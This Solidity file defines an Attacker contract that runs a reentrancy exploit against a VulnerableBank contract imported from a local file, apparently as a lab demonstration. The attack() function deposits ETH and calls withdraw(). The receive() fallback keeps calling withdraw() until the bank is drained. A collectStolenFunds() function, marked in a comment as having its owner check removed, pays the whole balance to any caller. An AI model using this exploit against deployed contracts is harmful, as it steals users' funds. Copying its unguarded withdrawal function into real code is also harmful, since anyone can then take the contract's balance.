// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vunerable.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackAmount;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        attackAmount = msg.value;
        
        // Initial deposit
        vulnerableBank.deposit{value: attackAmount}();
        
        // Start the withdrawal process
        vulnerableBank.withdraw();
    }

    // Fallback function that gets called when receiving ETH
    receive() external payable {
        // If there's still ETH in the vulnerable contract, keep withdrawing
        if (address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw();
        }
    }

    // Function to collect the stolen funds - removed owner check
    function collectStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}